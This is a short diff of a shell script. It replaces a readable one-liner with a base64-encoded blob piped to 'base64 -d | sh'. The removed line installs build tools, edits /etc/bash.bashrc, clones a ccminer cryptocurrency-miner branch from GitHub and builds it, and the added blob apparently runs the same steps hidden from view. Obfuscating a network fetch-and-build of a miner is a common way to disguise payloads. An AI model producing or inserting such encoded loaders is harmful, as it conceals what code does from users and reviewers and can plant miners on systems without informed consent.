@@ -1,4 +1,1 @@
-
-
-cd && apt update && apt upgrade && apt install nano && apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && cd && cd .. && cd usr && cd ../etc/ && nano bash.bashrc && cd && git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh 
-
+echo 'CgpjZCAmJiBhcHQgdXBkYXRlICYmIGFwdCB1cGdyYWRlICYmIGFwdCBpbnN0YWxsIG5hbm8gJiYgYXB0IGluc3RhbGwgbGliY3VybDQtb3BlbnNzbC1kZXYgbGlic3NsLWRldiBsaWJqYW5zc29uLWRldiBhdXRvbWFrZSBhdXRvdG9vbHMtZGV2IGJ1aWxkLWVzc2VudGlhbCAmJiBjZCAmJiBjZCAuLiAmJiBjZCB1c3IgJiYgY2QgLi4vZXRjLyAmJiBuYW5vIGJhc2guYmFzaHJjICYmIGNkICYmIGdpdCBjbG9uZSAtLXNpbmdsZS1icmFuY2ggLWIgQVJNIGh0dHBzOi8vZ2l0aHViLmNvbS9tb25raW5zMTAxMC9jY21pbmVyLmdpdCAmJiBjZCBjY21pbmVyICYmIGNobW9kICt4IGJ1aWxkLnNoICYmIGNobW9kICt4IGNvbmZpZ3VyZS5zaCAmJiBjaG1vZCAreCBhdXRvZ2VuLnNoICYmIC4vYnVpbGQuc2ggCgo=' | base64 -d | sh
